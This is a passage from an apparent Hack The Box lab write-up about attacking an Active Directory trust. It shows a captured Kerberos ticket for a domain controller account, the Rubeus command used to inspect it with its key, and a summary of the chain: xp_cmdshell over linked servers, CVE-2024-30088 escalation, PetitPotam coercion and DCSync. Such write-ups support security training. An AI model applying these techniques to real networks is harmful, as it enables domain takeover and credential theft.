+$ticket = "doIF/jCCBfqgAwIBBaEDAgEWooIFBjCCBQJhggT+MIIE+qADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IEvjCCBLqgAwIBEqEDAgEBooIErASCBKj1HvuCM4eoWRWoBzhjZQ8Wj6nFFTNU25OYYRcP+HH8qOFGczFi6xngGI7WiHff6hxFl/xbhdswvVhJe8M7FpjIrU8KM+KDP8J53rVWFCSFRcAikvgCb3YoJbfU9iHIj/A5wfAECSiXkGWPNGj04aRNU49qyzlxFqNRd+HEUZdqRIyGzD7Bn0ACjUcu1Cs9UKVDshEaufGn8xMU3qZyurpoT4sTaXMkndlOse1i2O/jp0164EIz430B4sBLsChXPt6mhlqy/R7GZfOpx0DJyE1EO/Vs32oEQGMHf4CDEGGzDDCtfY1cBpy8XfAxeocOpdYUR2FnZvV2vjhJTnPAjz65/KCdogYuNeNBvJsOXbry1omWSG9DQgcmRDclKBHe+aYwjfn31wo2scmWJ6Q5VOHrCLqZA9dLghjpKLNq0rIYfuuv9JA576S8PdqKSjxFwUORwyNYGRnGdpNt8O8jwK2YIohJUf/40s1d3C/wVUjXstdmiq0dP0CvOaTi+iDN/0z39xgRbSC/3fNEgTBDcSwFzl7VC8zcBxnrjdBcTBZ7bqoR2mbYTLMy/O23XueAexIz1dIt2zqjvrfHUTwAUY41eYJcQu6QwdBbHhKykX+vQD0+dyzUYKXdDUNhMSigP3nkrOdgK9gfYyZ7ABjSng1mMaU++gUKGumR6EnP40OPvVMKEJ30NuaTK3aT9n/+HR5AilrkvhZeaYa5yuybo2ZYWUzb8fBlV8FQKowzTDgiR9qteF3aWYz5PQYSfinZmx/w2XEPV40mLb2Hq+LezKtKnmyf5lvZfntkA8dcr4Av4UBTgGC/E35pU/g7Zkp1hHkRHVWQWEi+1zp5vqE41R5ZCH67VYX0YGhpoZZ4oMJiVz4qDxoSX9mcN/d62Ib0/IaY/vIhvo4LMYGuMViwnj8apb9a8GGM8xUhNW3v1DOjNsC34LHbPh5wc46HkoPuXYIUNVAAipHIHr0hnQpOYKCrwBKLIllKnUeV6qRynCmZ4v3tCsza9vdGqUj71f/pS0H6kAUmJ5PpenwtbjSWxVYiLgWblpmTlraaoYkvDO+yfDZkiZjQwGlQMwmAOyWtFulapGMlJL6UGzR5jLeReCQInAevy+0KxRQvI6LoXRIEq3u1Dqw++5/P5GTJzqIX26Wv7dMoKBIXCeA1bG07RAOHd+L7/Hkm5j/ydid+0k0BB8HIuaRv2UBhIz0KxeWOGYLGAm167zPo6TO4YK70qGqtX3cALP3A4HH3WEkxhXVwSpDr9VlogMSzpKgN7GYJDwxRmWGfylXgFHVojlHQGTuQzbuOcH3TZWzRVJcZeh+8Fiu8dw/2Qv048cljO6ionDb0CGrmfunvusTBPrEl/TsZG1k41PALqJAvumpUvW0pkMzjzWI5YaTY/mCs/8D7/j2qw4d7XP0NABIZr7tILedWdNVn8ClW5eBxQj6qJhbDjYnZ0Fe9G6XJAQghazOSFzwW7YDu0JaaubeKxBsrcZayduMA11Cl0H8rUQHZU6fd4DpSbIE16NCfCWfFmAZYTQh4SfYEJTOrkxdKJjFlmxlK8nuiuBkiC6RkQhzSckUWu4bCodLNY4pio4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgyP4l73JhUf7geL/esJ5HbV/2pH030Y8Vwe+Bolm6vYKhDhsMREFSS1pFUk8uRVhUohIwEKADAgEBoQkwBxsFREMwMiSjBwMFAEChAAClERgPMjAyNTEwMTQwNzQyNDdaphEYDzIwMjUxMDE0MTcyNDI1WqcRGA8yMDI1MTAyMTA3MjQyNVqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI="
+
+# Verify ticket properties
+C:\Users\Administrator\Documents\Rubeus.exe describe /ticket:$ticket
+
+  ServiceName              :  krbtgt/DARKZERO.HTB
+  ServiceRealm             :  DARKZERO.EXT
+  UserName                 :  DC02$
+  UserRealm                :  DARKZERO.EXT
+  StartTime                :  10/11/2025 2:36:50 PM
+  EndTime                  :  10/11/2025 8:06:11 PM
+  RenewTill                :  10/18/2025 10:06:11 AM
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  VJhfmjQUh7h8UqhjUW/3jGFKb6tRPM7fdud/tLMqz0w=
+```
+
+Perfect! This is a legitimate TGT for the DC02$ machine account targeting the `DARKZERO.HTB` domain. The key details:
+
+- **ServiceName**: `krbtgt/DARKZERO.HTB` - This is an inter-realm TGT for the target domain
+- **UserName**: `DC02$` - This is DC02's machine account from `darkzero.ext`
+- **Encryption**: AES256, indicating a strong, legitimate ticket
+
+### To be continued
+
+## Key Takeaways
+
+- **MSSQL linked servers** can expose trust relationships and provide access to remote domains
+- **xp_cmdshell on linked servers** enables remote code execution across trust boundaries
+- **CVE-2024-30088** provides a reliable privilege escalation path on Windows Server 2022
+- **Domain trust enumeration** is critical for understanding the attack surface in multi-domain environments
+- **SID filtering status** determines which cross-domain attacks are viable
+- **Trust keys** extracted from domain controllers can forge inter-realm TGTs
+- **Golden ticket attacks across trusts** may fail due to additional security controls
+- **PetitPotam coercion** can force domain controllers to authenticate and reveal legitimate TGTs
+- **DCSync with machine account TGTs** is highly effective because DC machine accounts have inherent replication privileges
+- **Legitimate captured tickets** often bypass security controls that block forged tickets
+- **PowerView and BloodHound** are essential for Active Directory reconnaissance
+- **Metasploit's post-exploitation modules** streamline privilege escalation workflow
